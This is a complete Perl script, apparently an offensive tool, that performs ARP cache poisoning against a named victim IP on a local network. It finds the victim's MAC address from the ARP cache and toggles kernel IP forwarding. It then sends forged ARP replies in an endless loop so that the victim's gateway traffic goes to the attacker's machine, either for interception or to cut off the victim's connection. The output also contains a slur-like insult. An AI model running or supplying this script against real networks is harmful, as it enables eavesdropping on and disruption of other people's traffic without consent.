#!/usr/bin/perl

use strict;
use warnings;
use Net::ARP;

my $login = (getpwuid $>);
if($login ne 'root'){ print("You must be root to run this program.\n");exit(1);}

if(defined($ARGV[0]) == 0 || defined($ARGV[1]) == 0 || defined($ARGV[2]) == 0) 
{
	print("Usage : $0 <gateway> <victim_ip> <routing packets status>\nSet the \"routing packets\" argument to 0 if you want to prevent the victim connection\n"); 
	exit(1); 
}

my ($i,$dev,$ip_attack,$state) = (0,0,0,"");
my ($ip_source_gateway,$ip_dest_victim,$status_connection) = ($ARGV[0],$ARGV[1],$ARGV[2]);
my $addr_mac_ARP_spoof = Net::ARP::get_mac("wlan0");
my $addr_mac_dest_victim = 0;
my (@list_addr,@ifconfig) = ((),());

$SIG{INT} = 'restore';

sub restore { 	
	
	print "Problem caught during the cache poisoning, stupid f4g ><"; 
	if($status_connection == 1) 
	{ 
		system("echo 0 > /proc/sys/net/ipv4/ip_forward"); 
		print "\nRestoring default parameter for /proc/sys/net/ipv4/ip_forward :			
	  	\nOld value : $status_connection\nRestored value : 0 \n";
		exit(1);	
	}	
	else	
	{		
		print "\nBye...\n";
		exit(1);
	}
}

if($status_connection == 1)
{
	$state = "On";
}
else
{
	$state = "Off";
}

open(IFCONFIG,"ifconfig|") or die("$!");

while(<IFCONFIG>)
{
	chomp $_;
	push(@ifconfig,$_);
}	


foreach my $y (@ifconfig) 
{
	if($y =~ /inet adr:(((2[0-5][0-5]|1[0-9][0-9]|[0-9]{1,2})\.){3}(2[0-5][0-5]|1[0-9][0-9]|[0-9]{1,2}))  Bcast/)
	{
		$ip_attack = $1;
	}
}

close(IFCONFIG);

open(CACHE_ARP,"ping -c 3 $ip_dest_victim > /dev/null && arp -an|") or die("$!");

while(<CACHE_ARP>)
{
	push(@list_addr,$_);
}

foreach my $x (@list_addr) 
{
	if($x =~ m/\? \($ip_dest_victim\) ((à|at)) (([\d\w]{2}[:-]){5}[\d\w]{2})/)
	{
		$addr_mac_dest_victim = $3;
		system("echo $status_connection > /proc/sys/net/ipv4/ip_forward");
	}
}

if($addr_mac_dest_victim eq '0')
{
	print("MAC victim cannot be retrieved, you should check the validity of the target IP.\n");
	restore();
}

close(CACHE_ARP);

print "
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ IP Source      : $ip_attack       +
+ IP Gateway     : $ip_source_gateway      +
+ MAC spoofed    : $addr_mac_ARP_spoof  +
+ MAC Dest       : $addr_mac_dest_victim  +
+ Routing Packet : $state                 +
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n
";

for(;;)
{
	if(Net::ARP::send_packet('wlan0', $ip_source_gateway, $ip_dest_victim, $addr_mac_ARP_spoof, $addr_mac_dest_victim,'reply'))
	{
		print "Sending ARP packet #$i (reply) infos :
				To $ip_dest_victim ($addr_mac_dest_victim)
				From $ip_source_gateway ($addr_mac_ARP_spoof)\n";
	}
	$i++;
	sleep(1);
}
